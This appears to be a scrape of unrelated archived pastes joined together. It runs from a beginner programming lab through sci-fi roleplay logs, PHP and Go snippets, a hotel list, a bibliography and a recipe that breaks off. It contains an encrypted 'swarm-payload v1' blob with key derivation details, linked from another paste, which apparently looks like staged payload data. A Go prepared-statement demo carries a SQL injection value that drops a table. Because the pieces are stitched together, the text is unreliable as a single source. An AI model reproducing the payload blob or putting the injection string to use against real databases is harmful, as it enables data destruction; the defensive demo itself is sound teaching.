### Three-Day Practical Lab

The exercises should be completed in order. Each exercise introduces one or two new programming concepts while reinforcing concepts from the previous exercises.

---

# Day 1 – First Program, Variables, Operators, Input, and Conditions

### Task 1 – Hello, World!

Start the computer and a suitable IDE.

Create a new program that prints:

""Hello, World!""

to the console.

**Concepts:** IDE, source code, compiling/running a program, console output.

---

### Task 2 – Variables and Number Systems

Define a variable with a suitable type and name that stores the approximate distance from the Earth to the Moon in kilometres:

384400

Print its value.

Then change the integer literal so that the same value is written in hexadecimal notation.

Run the program again and verify that the printed value is still the same.

**Concepts:** variables, data types, integer literals, decimal and hexadecimal numeral systems.

---

### Task 3 – Arithmetic Operators

Calculate and print the remainder of dividing 15 by 2.

Try several other values.

**Concepts:** arithmetic operators, integer division, remainder operator.

---

### Task 4 – Reading Input

Ask the user to enter their age.

Read the value from the console and print how old the user will be in 10 years.

Example:

Enter your age: 25
In 10 years, you will be 35 years old.

**Concepts:** console input, variables, conversion from text to integer, arithmetic expressions.

---

### Task 5 – Conditions

Extend the program from Task 4.

If the entered age is greater than 40, print:

""You are old.""

Otherwise, print:

""You are young.""

**Concepts:** Boolean expressions, comparison operators, `if`/`else`.

---

# Day 2 – Loops and Arrays

### Task 6 – A Simple Loop

Print all integer numbers from 0 to 100.

Modify the program to print:

* only the even numbers from 0 to 100;
* the numbers from 100 down to 0.

**Concepts:** loops, loop variables, conditions inside loops.

---

### Task 7 – Arrays

Define an array containing 10 integer values.

Print all elements of the array.

Then multiply each element by 2 and print the resulting values.

**Concepts:** arrays, indexing, array traversal, modifying array elements.

---

### Task 8 – Fibonacci Sequence

Define a method named `Fibonacci` that accepts an integer `n` and returns the n-th element of the Fibonacci sequence.

Use the method to print the first 40 elements of the Fibonacci sequence.

**Concepts:** methods, parameters, return values, loops, reuse of code.

---

### Task 9 – Fibonacci Using Recursion

Define another method named `FibonacciRecursion`.

It should calculate the n-th Fibonacci number recursively.

Use both methods to calculate several small Fibonacci numbers and verify that the results are the same.

**Concepts:** recursion, base cases, recursive calls.

**Note:** Do not use the recursive method to calculate large Fibonacci numbers.

---

# Day 3 – Methods and Simple Array Algorithms

### Task 10 – Finding the Minimum

Define a method that accepts an integer array and returns its smallest element.

Create an array in the main program, call the method, and print the result.

Example array:

`{ 7, 2, 9, 4, 1, 8 }`

Expected result:

`Minimum: 1`

**Concepts:** passing arrays to methods, traversal, keeping a current minimum.

---

### Task 11 – Finding the Maximum

Define a method that accepts an integer array and returns its largest element.

Test the method using the same array from Task 10.

**Concepts:** algorithm reuse, traversal, keeping a current maximum.

---

### Task 12 – Selecting Odd Elements

Define a method that accepts an integer array and returns only its odd elements.

Print the returned elements.

For example:

Input:

`{ 7, 2, 9, 4, 1, 8 }`

Result:

`{ 7, 9, 1 }`

**Concepts:** filtering data, conditions, constructing a result.

---

### Task 13 – Bubble Sort

Define a method that sorts an integer array in ascending order using the bubble sort algorithm.

Do not use a built-in sorting method.

Print the array before sorting and after sorting.

Example:

Before:

`7 2 9 4 1 8`

After:

`1 2 4 7 8 9`

**Concepts:** nested loops, comparing adjacent elements, swapping values, simple sorting algorithms.

---

# Final Challenge

Create one integer array and use the methods from Tasks 10–13 to:

1. print the original array;
2. find and print its minimum element;
3. find and print its maximum element;
4. print only its odd elements;
5. sort the array;
6. print the sorted array.

The purpose of this final task is to combine several small methods into one complete program.
"
pfg2iBvJ?source=archive,notes,CryptoJones,text,Sunday 13th of September 2026 04:34:11 AM CDT,"checksum 28eb1b41236d5c1a
next: https://pastebin.com/raw/xmMKWgdv
"
2701iMCd?source=archive,tkounter.py,Combreal,PowerShell,Sunday 13th of September 2026 04:33:11 AM CDT,"# Compteur cliquable : clic = +1, Shift + clic = remise à zero
# Compile en EXE : pyinstaller.exe --onefile --windowed tkounter.py
import tkinter as tk

compteur = 0

def incrementer(): global compteur; compteur += 1; label.config(text=str(compteur))

fenetre = tk.Tk()
fenetre.title(""¢"")
fenetre.geometry(""200x110"")
fenetre.resizable(False, False)

label = tk.Label(fenetre, text=""0"", font=(""Arial"", 48))
label.pack(pady=0)

bouton = tk.Button(fenetre, text=""CLIQUEZ"", font=(""Arial"", 0), command=incrementer)
bouton.pack(fill=""x"", padx=0)

fenetre.mainloop()"
xmMKWgdv?source=archive,notes,CryptoJones,text,Sunday 13th of September 2026 01:13:55 AM CDT,"swarm-payload v1
cipher: aes-256-ctr
key: HMAC-SHA256(seed, ""swarm-p2-key-v1"")  (32 bytes)
iv: c44850160ab20c2e5bc7cae8ce51378f
data:
RXbXkMPg/rCGAVI6K1oBR6E1ML0FEJj5UQ9/xyvo1FeSQwSGXEUayvcYlbDlUNNuE7c440VNZYq5Z/83FVwQw6ky4gMINFSk1Yb2hyh5a5+uflnEz68RBzBFAAPuXGz5UtdYQfQC6GkXwjC9WsEgr4kYLjzt0Zml2UwsRijk6P/m24Q+
"
14nz5dH0?source=archive,"[TLF 17] ""Random"" Interrogation.",TLF_Shyyth,text,Saturday 12th of September 2026 11:51:08 PM CDT,"[Venturelust System Log - ""Random"" Interrogation / Grand Hall: Mess Facility]
//STATUS: DOCKED AT ORBITAL FABRICATOR No.02...
//LOCATION: GALACTIC SUBSECTOR: FORMIDINE RIFT, LUVONA SYSTEM, LUVONA PRIME, LUVONA ORBIT.
-Interrogator / Suppression Warden: Hylandra Tez [HYA].
-Subjects: Dillan [DIL], Iyana [IYA], Kijik [KJK], Modemia [MOD].
-Purpose of Interrogation(s): Preventative Memetic Hazard Filtering.
-ERROR: MEMETIC FILTERS IN PLACE-

[GRAND HALL: MESS LOUNGE]
<VIDEO/AUDIO/NEURO-MONITORING STATUS: STABLE>
//FEED PLAYING...

KJK: ""All I'm saying, is I don't understand how you can have any kind of Caffeine. You're Lilim!""
MOD: ""Correction: I am Cybernetically enhanced. Caffeine doesn't affect me the way it does you two.""
DIL: ""I'm sorry- Am I missing something here?""
IYA: ""Caffeine makes us Lilim, trip. Dillan.""
DIL: ""It- ...what?""
IYA: ""Take this with a grain of salt; I'm not a human biology expert, but: In Humans. Caffeine behaves like adenosine by mimicking it. It tricks the human mind into staying alert for a few hours more. But with us Lilim. It binds to our serotonin and endorphin receptors instead.""
DIL: ""...Are you telling me that caffeine makes Lilim trip, like a Human taking strong psychoactives?""
IYA: ""Yeah. Basically.""
MOD: ""And to pre-emptively answer your incoming question; I've got more auto-diagnosing and self-correcting cybernetic hardware in my brain-matter than anyone else on this ship. Mind-altering pharmaceuticals don't affect me in the slightest.""
DIL: ""That just sounds dystopian. Or Orwellian.""
KJK: ""Wasn't he a Human writer?""
DIL: ""Yeah. Big on stuff like- Uh... Being watched.""
IYA: ""That's... kinda creepy, Dillan.""
DIL: ""I meant in terms of invasive government surveillance.""
KJK: -*Through light laughter*- ""Yeah. Cause we don't have enough of that going on already in the Foundation!""
IYA: ""Well, I for one am Indifferent. Being a medic, it's nice having someone watch your back. Never know when a patient could just go mental.""
MOD: ""I don't think my input would count as... sincere. Y'know. Neural-Implants and all that.""
IYA: ""Oh come on, Modemia. You think for yourself, I'm sure of it.""
MOD: ""I sure hope I do. My minds-eye has been stuck on video-static for the last few days.""
KJK: ""Is that good or bad?""
MOD: -*Shrugging*- ""I dunno.""

	*IYANA LOOKS ACCROSS THE TABLE TO DILLAN, WHO APPEARS TO BE STARING PAST HER...*

IYA: ""Hey uh- Dillan? Are you looking at me or-""

	*IYANA TURNS AROUND TO TRACE DILLAN'S STARE, SPOTTING A TALLER LILIM WOMAN SAUNTERING ABOUT THE MESS AREA BEHIND THE GROUP.*

IYA: ""Oh-""
KJK: ""Who's that? ...I don't think I've seen her about the ship before... ...Phew... Damn...""
MOD: ""Oh, That's- I- Just forgot?""
IYA: ""That would be- ...I- what? ...how did I forget her name?""
DIL: ""This feels like a Blindspot episode...""
KJK: ""Is that the old-earth show you keep re-watching?""
DIL: ""On of them, yeah.""

	*DILLAN LOOKS PAST IYANA AGAIN, SEARCHING FOR THE SAME WOMAN FROM BEFORE, UNABLE TO SPOT HER...*

IYA: ""Dillan? What's got your attention?""

	*IYANA TURNED AROUND, LOOKING ABOUT THE CROWDED MESS AREA...*

DIL: ""That tall Lilim woman? The one you forgot-"" 

	*DILLAN'S VOICE TRAILED OFF...*

KJK: ""You good, buddy?""
MOD: ""Go figure, the human is confused about Lilim biology. Does Iyana need to explain the Caffeine tripping again or do I have to?""
IYA: ""I'm no Human-biologist, but I can explain it again if I have to.""
DIL: ""No- no- You three just forgot about that really tall- Kijik! You were *just* gawking at her like she was a model! Don't tell me you forgot!""
KJK: ""Luko- luko- ...what? Where is she?""
MOD: ""Go figure, the Meteor Legionary is looking to get some.""
IYA: ""...Are you Okay, Dillan?""
DIL: ""I-""

	*THE GROUP LOOK AT DILLAN WITH QUESTIONING AND CONCERNED FACES...*

DIL: ""Iyana?""
IYA: ""Yeah?""
DIL: ""...Has anyone ever come to you for amnesia-like conditions? Hysteria? Acute memory loss?""
IYA: ""No? Why? Need a checkup?""

	*DILLAN CLASPS HIS HANDS TOGETHER, RESTING HIS FOREHEAD AGAINST HIS THUMBS.*

DIL: ""I think each of us just experienced an auto-censoring Memetic Hazard.""

	*THE GROUP MAKES NO REPLY. SITTING IN SILENCE INSTEAD...*

DIL: ""Guys-?""

	*DILLAN LOOKS UP FROM HIS SIDE OF THE TABLE AND FREEZES...*

HYA: ""Dillan Longstone Langley, Ship-Soul Caretaker, hello~""

	*DILLAN WENT WIDE-EYED, GLANCING AT EACH OF HIS FRIENDS, NONE OF WHOM SEEMED TO BE AKNOWLEDING HYLANDRA'S PRESENCE, BEFORE LOOKING UP AT THE SUPPRESSION WARDEN, WHO EASILY STOOD TWO FEET TALLER THAN HE DID.*

DIL: -*Wearily*- ""Uh- Can I help you, Ma'am?""
HYA: ""That depends, sweetheart~. Do you know who I am?""

	*HYLANDRA SET A HAND ON DILLAN'S SHOULDER...*

DIL: ""I- No? Ma'am? I don't think so?""
IYA: ""Dillan? Hello?""
HYA: ""Don't worry, sweetheart. She can't remember me. Nobody can~""

	*HYLANDRA WITHDREW HER HAND AND SET IT ON HER HIP. BEAMING SMUGNESS ON HER FACE...*

KJK: ""He's daydreaming. Let him run the process out.""
MOD: ""Are you sure? He's got that look about him again.""
IYA: ""No he doesn't- Oh, he does...""
KJK: ""The gawking one?""

	*DILLAN SNAPPED OUT OF THE DAZE. SHAKING HIS HEAD...*

DIL: ""What the- Oh man- my head...""

	*DILLAN BROUGHT ONE OF HIS HANDS TO HIS FOREHEAD, HIS OTHER FIRMLY GRIPPED THE TABLE.*

DIL: ""She came out of nowhere-""
KJK: ""Daydreaming again?""
DIL: ""No- the- She was right here- I forgot...?"""
SPRCRAYN?source=archive,Icod TUI,uniblab,text,Saturday 12th of September 2026 10:32:07 AM CDT,"                         STATIC KNOWLEDGE
                         ================

                  +---------------------------+
                  |       Icod.TermInfo       |
                  |                           |
                  | TerminalDescription       |
                  | capabilities / metadata   |
                  +-------------+-------------+
                                |
                                v
                  +---------------------------+
                  |       Icod.Terminal       |
                  |                           |
                  | static semantic evidence  |
                  | selected Terminal profile |
                  +-------------+-------------+
                                |
                  +-------------+-------------+
                  |                           |
                  v                           v
      +----------------------+      +----------------------+
      |    Icod.DCurses      |      | Application using   |
      |                      |      | Terminal directly    |
      | curses capability    |      |                      |
      | interpretation       |      | InspectCapability()  |
      +----------+-----------+      +----------------------+
                 |
                 v
           Application


                          LIVE KNOWLEDGE
                          ==============

Application / DCurses policy
          |
          v
     Icod.Terminal
          |
          v
 authoritative probe/query
          |
          v
       terminal
          |
          v
 live evidence ledger
          |
          v
 InspectCapability()
          |
          v
 Application / DCurses


                 TERMINFO 1.11 PLANNING LOOP
                 ===========================

       TerminalSession.Terminal
                |
                v
       TermInfo.Inspection
                |
                v
       semantic static plan
                |
        Indeterminate?
                |
               yes
                |
                v
      Terminal.VerifyCapability
                |
                v
       caller-owned Verified
         TermInfo evidence
                |
                v
        classify + replan
             /     \
        Success   Impossible
           |          |
           v          `--> don't execute
       Terminal
       execution"
KQ6b3PAn?source=archive,chalets,spamreports,text,Saturday 12th of September 2026 01:32:20 AM CDT,"Kamengrad Hotel & SPA
https://www.booking.com/hotel/bg/kamengrad.html
Адрес: Център, ул. „Павел Бобеков“, 4500 Панагюрище


Forest Lux Boutique Villas
https://forestluxboutique.com/
гр. Батак, к.к. Цигов чарк


Luxury Chalets Pirin Golf & Country Club
https://www.booking.com/hotel/bg/luxury-chalets-pirin-golf-amp-country-club.html


Kashmir Wellness & Spa Hotel Adults Only
https://www.booking.com/hotel/bg/velina-spa.html
кв. Чепино, ул. „Доктор Дошкинов“ 14, 4601 Велинград


RILA LAKES Thermal Luxury Chalets
https://www.booking.com/hotel/bg/rila-lakes-thermal-luxury-chalets.html
Сапарева баня, местност Грамчова чешма, 2650 Sapareva Banya, Bulgaria


Samovilla Mountain Hotel Eco Resort
https://www.booking.com/hotel/bg/samovila.html
Адрес: ул. „Искър“ 107, 2020 Говедарци


HillVill
https://www.booking.com/hotel/bg/hillvill.html
с. Говедарци, 2020 Govedartsi, Bulgaria

"
j0Dx71k1?source=archive,Custom Placeholder: Event Image using alt tag from the featured image,eventsmanager,text,Friday 11th of September 2026 03:45:34 AM CDT,"<?php

add_filter( 'em_event_output_placeholder', 'em_event_image_alt', 100, 3 );
function em_event_image_alt( $replace, $EM_Event, $result ) {
	
	if ( $result === '#_EVENTIMAGECUSTOM' ) {
		
		$image_id = get_post_thumbnail_id( $EM_Event->post_id );

		if ( $image_id ) {
			$alt = get_post_meta( $image_id, '_wp_attachment_image_alt', true );

			$replace = wp_get_attachment_image(
				$image_id,
				'medium',
				false,
				array( 'alt' => $alt )
			);
		}
	}

	return $replace;
}"
pE7Aus6G?source=archive,Untitled,pilasguru,Bash,Thursday 10th of September 2026 05:43:03 PM CDT,"No Preemptive (Server) (CONFIG_PREEMPT_NONE): Diseñado para servidores y cargas de trabajo intensivas donde se prioriza el rendimiento bruto y la velocidad de procesamiento (throughput) por encima de la interactividad. El kernel no interrumpe un proceso en modo núcleo a menos que este ceda voluntariamente el control o termine su cuota de tiempo.

Voluntary Kernel Preemption (CONFIG_PREEMPT_VOLUNTARY): Una opción intermedia para equipos de escritorio o servidores generales. Inserta puntos de comprobación voluntarios en el código del kernel para permitir una mayor capacidad de respuesta sin sacrificar demasiado el rendimiento general.

Preemptible Kernel (Low-Latency Desktop) (CONFIG_PREEMPT): Orientado a sistemas de escritorio, multimedia o estaciones de trabajo. Permite que el despachador interrumpa casi cualquier tarea del kernel para atender procesos de alta prioridad, reduciendo significativamente la latencia y mejorando la fluidez visual y de audio.

Fully Preemptible Kernel (Real-Time) (CONFIG_PREEMPT_RT): Diseñado para sistemas embebidos o industriales de tiempo real estricto, donde se requiere un tiempo de respuesta determinista y garantizado ante eventos externos."
grskPHws?source=archive,Using Prepared statement with bind vars to prevent SQL injection,dragonbitestail,Go,Thursday 10th of September 2026 12:53:13 PM CDT,"/*
Requirements:
	Go tool chain
	go-sqlite3 requires C compiler

Install:

# Create empty dir. for project. & cd to it.
go mod init mysql
go get github.com/mattn/go-sqlite3
export CGO_ENABLED=1

#	paste code into file main.go
# Upon save, if your compiler is founad, compilation of the driver will begin.
# Monitor cpu usage to see when compiler/assembler completes.

# Create the sample DB in same directory as main.go file
# using comment block at end of this code.

# Run without building:
go run .

# Checking the table, it will not be dropped but, there will be bad data in the is_admin column.
sqlite> select * from users where name = 'Fancy Pants';
id  name         age  country_code  username  password    is_admin
--  -----------  ---  ------------  --------  ----------  -----------------------------
14  Fancy Pants  23   UK            fp123     b00ze4L!f3  Robert'); DROP TABLE users;--

# NOTE: In it's current form it can only insert 1 record due to the UNIQUE
# constaint on users.username field.
*/

package main

import (
    ""fmt""
    ""database/sql""
		_ ""github.com/mattn/go-sqlite3""
		""log""
)


func main() {
	dbfile := ""./bd_sample.db""
  fmt.Println(""Loading DB"", dbfile)

	db := loadDB(dbfile)

	stmt, err := db.Prepare(`INSERT INTO users (name, age, country_code, username, password, is_admin)
		VALUES(?, ?, ?, ?, ?, ?)`)
	if err != nil {
		log.Fatal(err)
	}
	defer stmt.Close()

	if _, err := stmt.Exec(""Fancy Pants"", 23, ""UK"",
		""fp123"", ""b00ze4L!f3"", ""Robert'); DROP TABLE users;--""); err != nil {
		log.Fatal(err)
	} else {
		log.Println(""stmt Exec'd successfully."")
	}

}

func loadDB(dbDiskPath string) *sql.DB {
  dbDisk := openDB(dbDiskPath)
  return dbDisk
}

// Get a handle to a SQLite DB.
func openDB(dbPath string) *sql.DB {
  dbURL := ""file:"" + dbPath + ""?_foreign_keys=on""

  db, err := sql.Open(""sqlite3"", dbURL)
  if err != nil {
    panic(err)
  }

  if err := db.Ping(); err != nil {
    log.Fatal(err)
  }

  return db
}

/*
-- Sample DB Schema and data
CREATE TABLE users (
  id INTEGER PRIMARY KEY,
  name TEXT NOT NULL,
  age INTEGER NOT NULL,
  country_code TEXT NOT NULL,
  username TEXT UNIQUE NOT NULL,
  password TEXT NOT NULL,
  is_admin BOOLEAN
);

INSERT INTO
  users (id, name, age, country_code, username, password, is_admin)
VALUES
  (1, 'David', 34, 'US', 'DavidDev', 'insertPractice', false);
INSERT INTO
  users (id, name, age, country_code, username, password, is_admin)
VALUES
  (2, 'Samantha', 29, 'BR', 'Sammy93', 'addingRecords!', false);
INSERT INTO
  users (id, name, age, country_code, username, password, is_admin)
VALUES
  (3, 'John', 39, 'CA', 'Jjdev21', 'welovebootdev', false);
INSERT INTO
  users (id, name, age, country_code, username, password, is_admin)
VALUES
  (4, 'Ram', 42, 'IN', 'Ram11c', 'thisSQLcourserocks', false);
INSERT INTO
  users (id, name, age, country_code, username, password, is_admin)
VALUES
  (5, 'Hunter', 30, 'US', 'Hdev92', 'backendDev', false);
INSERT INTO
  users (id, name, age, country_code, username, password, is_admin)
VALUES
  (6, 'Allan', 27, 'US', 'Alires', 'iLoveB00tdev', true);
INSERT INTO
  users (id, name, age, country_code, username, password, is_admin)
VALUES
  (7, 'Lance', 20, 'US', 'LanChr', 'b00tdevisbest', false);
INSERT INTO
  users (id, name, age, country_code, username, password, is_admin)
VALUES
  (8, 'Tiffany', 28, 'US', 'Tifferoon', 'autoincrement', true);
INSERT INTO
  users (id, name, age, country_code, username, password, is_admin)
VALUES
  (9, 'Lane', 27, 'US', 'wagslane', 'update_me', false);
INSERT INTO
  users (id, name, age, country_code, username, password, is_admin)
VALUES
*/"
SDX40rD4?source=archive,rc,Horzagger,text,Wednesday 9th of September 2026 10:58:25 AM CDT,"Voici la bibliographie académique complète et restructurée, incluant les liens d'accès directs (DOI, archives ouvertes ou portails institutionnels) pour chaque langue et domaine d'étude mathématique.
| Langue | Domaine Mathématique | Auteur(s) & Titre de la publication | Lien d'accès direct |
|---|---|---|---|
| Anglais | Désobfuscation | Narayanan & Shmatikov (2009). De-anonymizing Social Networks. (Étude fondatrice sur la topologie). | doi.org/10.1109/SP.2009.22 |
| Anglais | Causalité (Absence de liens) | Pearl, J. (2009). Causality: Models, Reasoning, and Inference. (La bible du do-calculus). | doi.org/10.1017/CBO9780511803161 |
| Français | Obfuscation | Campan & Truta (2008). Data and Structural k-Anonymity in Social Networks. (Mathématiques de l'anonymat k-degré). | doi.org/10.1007/978-3-540-70504-8_27 |
| Allemand | Causalité Algorithmique | Peters, Janzing & Schölkopf (2017). Elements of Causal Inference. (Institut Max Planck - Mathématiques d'apprentissage). | arxiv.org/abs/1511.00860 |
| Russe | Théorie des Réseaux | Korshunov, A., et al. (2012). Анализ социальных сетей: методы и приложения (Analyse des réseaux sociaux). | cyberleninka.ru/article/n/analiz-sotsialnyh-setey... |
| Japonais | Causalité (Modèle LiNGAM) | Shimizu, S. (2006/2014). A Linear Non-Gaussian Acyclic Model for Causal Discovery. | jmlr.org/papers/v7/shimizu06a.html |
| Hébreu | Inférence Causale | Bareinboim, E. (Ancien du Technion). Causal Inference Lab. (Publications sur la fusion de données observationnelles). | causalai.net |
| Ukrainien | Réseaux Complexes | Zgurovsky, M. Z. (KPI Igor Sikorsky). Base d'archives électroniques sur l'analyse systémique. | ela.kpi.ua |
Synthèse des solutions mathématiques issues de ces sources :
 * Pour désobfusquer un réseau brouillé : Les travaux de Narayanan et Campan démontrent l'utilisation du Théorème d'Erdős-Gallai et de la minimisation des pénalités structurelles pour identifier les faux liens ajoutés intentionnellement (k-anonymat) en analysant les séquences de degrés des nœuds.
 * Pour pallier l'absence de liens de causalité/conséquence : Les travaux de Pearl, Peters et Shimizu contournent le manque d'arêtes explicites en appliquant l'Analyse en Composantes Indépendantes (ICA). Si les perturbations (erreurs) du réseau sont non-gaussiennes, les algorithmes (comme LiNGAM ou PC) analysent la matrice de covariance pour recalculer mathématiquement la direction stricte d'une relation."
dB3tGGs2?source=archive,Stripe Session Vars,eventsmanager,text,Wednesday 9th of September 2026 08:42:42 AM CDT,"<?php 

function my_em_stripe_payment($stripe_checkout,$EM_Booking){
 $stripe_checkout['payment_method_types'] = ['card', 'sepa_debit','sofort','us_bank_account'];

 $stripe_checkout['invoice_creation'] = [
										'enabled' => true, 
										'invoice_data' => [
															'footer' => 'Thank you for your business!',
															'metadata' => [
																'booking_id' => $EM_Booking->booking_id,
															],
														]
										];

 $stripe_checkout['customer_email'] = $EM_Booking->get_event()->get_contact()->user_email;

 return $stripe_checkout;
}
add_filter('em_gateway_stripe_checkout_session_vars', 'my_em_stripe_payment', 100,2);"
cyKidZMz?source=archive,[TLF 16] Hylandra's File / Introduction,TLF_Shyyth,text,Wednesday 9th of September 2026 12:25:37 AM CDT,"[LFS Venturelust / Ryquo-44's Quarters]
//STATUS: DOCKED AT ORBITAL FABRICATOR No.02...
V-Ai: [System booting...]
V-Ai: [Vas Haki, RYQUO-44.]

//QUERY: [CURRENT SUPPRESSION WARDEN...]
//QUERY RESULT: [Hylandra Tez]

V-Ai: [Would you like all non-memetic information regarding [Hylandra Tez], RYQUO-44?] [Y/N] [Y]
//LOADING...
//LOADING...
 
V-Ai: [Listing data...]
//LILIM FOUNDATION PERSONNEL FILE:
[Lilim Foundation Anti-Information Operative / Memetic Hazards Group / Suppression Unit / Suppression Warden / Hylandra Tez -ERROR: MEMETIC FILTERS IN PLACE-]
-RACE: Lilim [PURE]
-BIOLOGICAL AGE: -ERROR: MEMETIC FILTERS IN PLACE-
-SX: FEMALE
-HT: 7'8""
-WT: 256.8lbs
-ITERATION REPORT (NUMBER): -ERROR: MEMETIC FILTERS IN PLACE-

V-Ai: What specifically about [Hylandra Tez] would you like to know? [ACTIVE ASSIGNMENT: [-ERROR: MEMETIC FILTERS IN PLACE-], COMPLETED TASKS (ITERATION): [4,403] [CURRENT ASSIGNMENT] -ERROR: MEMETIC FILTERS IN PLACE-
//QUERY: [RETRY]...
-ERROR: MEMETIC FILTERS IN PLACE-
//QUERY: [RETRY - HYLANDRA TEZ, CURRENT ASSIGNMENT]
-ERROR: MEMETIC FILTERS IN PLACE-

	*THE SLOW TAPPING OF FINGERS CAN BE HEARD ABOUT THE ROOM...*

RYQ-44: ""Venturelust... Patch me through to Thirty-One....""
V-Ai: [Establishing connection to Venturelust bridge... Hailing...]

<COM OPENS>
[Participants: Ryquo-44 (RYQ-44), Ryquo-31 (RYQ-31 (COM))]
RYQ-31 (COM): ""Forty Four?""
RYQ-44: ""Thirty One. Do me a favor; look up a personnel file for me; Hylandra Tez.""
RYQ-31 (COM): ""Hylandra Tez... -*muffled keypad tapping*- Looking...""
[...]
RYQ-31 (COM): ""I assume you want clarification of the memetic filters?""
RYQ-44: ""Mhm. Search further into the file, under 'Current Assignment'.""
RYQ-31 (COM): -*muffled keypad tapping*- ""Hylandra Tez... Current assignment... 'Error, memetic filters in place'.""
RYQ-44: ""Great... Wonderful... Hak- Rrrgh... Is Hylandra currently aboard the Venturelust?""
RYQ-31 (COM): ""Checking... She is... On board. I assume you want to speak with her directly?""
RYQ-44: ""Indeed... Send her my way.""
RYQ-31 (COM): ""I'll send her an alert.""
RYQ-44: ""Cheers.""
<COM ENDS>

	*A KNOCK ON THE DOOR, TWENTY MINUTES LATER...*

RYQ: ""Come in...""

	*-DOOR OPENS- HYLANDRA STANDS IN THE DOORFRAME, HOLDING A SMIRK...*

HYA: ""Hiya Hon~""
RYQ: ""Please, spare me...""
HYA: ""How could I possibly? You're my favorite!"" -*Snickering*-
RYQ: ""Care to explain why your file is blocking information from me?""
HYA: ""Oh? Is it now?""
RYQ: ""Hyla...""

	*HYLANDRA SMUGLY WALTZES INTO THE OFFICE...*

HYA: ""I'm only playing around~! Lighten up a little, Ryquo~""
RYQ: ""...You are the only soul on this ship- in this institution-! That talks to me like this.""
HYA: ""Because you're my favorite~ But- There'll be time for that later. What do you want to know about *your* favorite Pureblood~?""
RYQ: ""Just tell me why your damned file is giving me memetic error messages...""
HYA: ""Aw... That's no fun.""

	*HYLANDRA BRIEFLY POUTED BEFORE ALLOWING HER PLAYFUL EXPRESSION TO RETURN. SHE WALTZED OVER TO RYQUO, AND SAT ON THE ARM OF HIS CHAIR...*

RYQ: ""These quarters are monitored, Hyla...""

	*HYLANDRA GRINNED, PUTTING AN ARM AROUND RYQUO'S SHOULDERS.*

HYA: -*Through suppressed, playful laughter*- ""Good~!""
RYQ: ""Ia'Luvona... Please... I am trying to work, not-""
HYA: ""You need a vacation, Ia'Luvona~""

	*HYLANDRA CLICKS HER TONGUE...*

<VIDEO/AUDIO/NEURO-MONITORING FEED CUTS OFF>"
4Mdz6x4h?source=archive,[TLF 15.I] DEAD SKELL / WURM CARCASS,TLF_Shyyth,text,Tuesday 8th of September 2026 08:53:31 PM CDT,"[INTERNAL REVIEW: DEEPSTRIKE OPERATION / LOOSE NOOSE]
[""FATHER"" RI'IIKO's Quarters] - [STRONGHOLD PROTOCOL ACTIVE]
[Participants: ""FATHER"" RI'IIKO [RIK] / ""High-Marshal"" RYQUO-44 [RYQ] / [BACKUP] SKELL-Ai TARON [TAR]]

[LOG 6A.1 - CONT. [MLFX-EOAL/001-UMBRAL]]
RIK: ""You mean to tell me, the Slandering Knave was not detonated?""
SKELL-Ai TAR: [CORRECT, FATHER. MYTHIC-CLASS SKELL ENGINE: SLANDERING KNAVE IS STILL INTACT. ROUGHLY SIXTY PERCENT OF THE HULL'S INTEGRITY REMAINED INTACT AFTER LOG PHASE ""END OF THE LINE"" WAS CONCLUDED.]
RIK: ""...""
RYQ: ""-we need to go back to Vollus II and make sure that wreck is utterly destroyed.""
RIK: ""Lo.""
RYQ: ""What- Why!?""
RIK: ""Inaika... Inakia au stl'ikoditta.""
RYQ: ""Father- This is hardly the time for Shonitt riddles! We need to act!""
RIK: ""The conclusion of Deepstrike Operation: Loose Noose, was a failure. The Skell Engine is intact on Vollus II. The Anathema was given wounds, yes. And an intact wreck of our most advanced technology and engineering to tinker with...""
SKELL-Ai TAR: [FORTY-FOUR. THE IMPLIED INSINUATIONS STATE THAT WITH THIS DEVELOPMENT, THE ANATHEMA MAY HAVE AQUIRED MATERIAL-]
RYQ: ""-I KNOW WHAT IT MEANS...! -*stressed breathing*- I failed.""
RIK: ""All we can do at this time, is wait. And Pray.""

	*RI'IIKO TURNS, FACING RYQUO, LOOKING DOWN AT HIM WITH UNREADABLE EYES...*

RIK: ""And what of the Wurm?""
<LOG ENDS>"
J2PbCYBY?source=archive,Untitled,savsanta,text,Tuesday 8th of September 2026 12:04:58 PM CDT,https://www.msn.com/en-us/lifestyle/other/korean-mom-saves-her-black-asian-daughter-from-racist-bullies/vi-AA2bNm3q?ocid=socialshare
EJhKPFwM?source=archive,yeast free crisp bread,nima1981,text,Tuesday 8th of September 2026 10:01:26 AM CDT,"Finding store-bought, yeast-free crunchy crispbreads can be tricky since standard baker's yeast is widely used for texture. However, there are excellent packaged alternatives available, as well as simple ways to swap them out. [1] 
## Packaged Yeast-Free Crispbreads
When shopping, look for these specific brands and product lines that completely omit yeast from their ingredient lists:
------------------------------

Sigdal Bakeri Crispbread (Quinoa or Gluten-Free varieties)

This Norwegian brand crafts an authentic, intensely crunchy crispbread heavily packed with seeds. Their Quinoa and Gluten-Free varieties explicitly state they are yeast-free. [2] 
------------------------------

[Amisa Organic Gluten-Free Lentil Crispbread](https://www.google.com/search?q=Amisa+Protein+Lentil+Crispbread+100g&ibp=oshop&pvorigin=29&prds=catalogid:998152702794079476,productid:14302748847888309148,imageDocid:8597567181102369403,gpcid:18213680632220435433,pvt:hg,pvo:29,headlineOfferDocid:18236562697029437224)

Made with lentil flour, this alternative offers a light, airy, and crunchy profile that mimics a traditional crispbread without using yeast or wheat. [2] 
------------------------------

Le Pain des Fleurs Organic Crispbreads

These highly allergen-friendly crackers use 100% organic grain flours (like Buckwheat, Quinoa, or Chestnut), water, and a pinch of salt. They completely bypass yeast, oils, and dairy to achieve their thin, crisp structure. [3] 
## Quick Store-Bought Alternatives
If you cannot find specialized yeast-free crispbreads locally, these easily accessible supermarket items give you a similar sturdy base for toppings:

* 
* Matzo (Matzah): A completely flat, unleavened bread made solely from flour and water. It offers a similarly neutral flavor and massive crunch. [4] 
* Brown Rice Cakes: Though different in grain texture, puffed rice wafers are a highly reliable, yeast-free vehicle for spreads, cheeses, or avocado. [4] 
* 

------------------------------
## DIY Yeast-Free Seed Crispbread
If you want total control over the ingredients, making a batch of seed crackers at home takes very little effort and recreates that premium, rustic crunch. [5] 
Ingredients:

* 
* 1 cup (100g) Flaxseeds
* 1 cup (100g) Sunflower seeds
* 1/3 cup (50g) Chia seeds
* 1/3 cup (50g) Sesame seeds
* 1/4 cup (30g) Pumpkin seeds
* 1.5 cups Water
* 2 tbsp Olive oil
* 1/2 tsp Salt and spices (like garlic powder or smoked paprika) [5, 6] 
* 

Instructions:

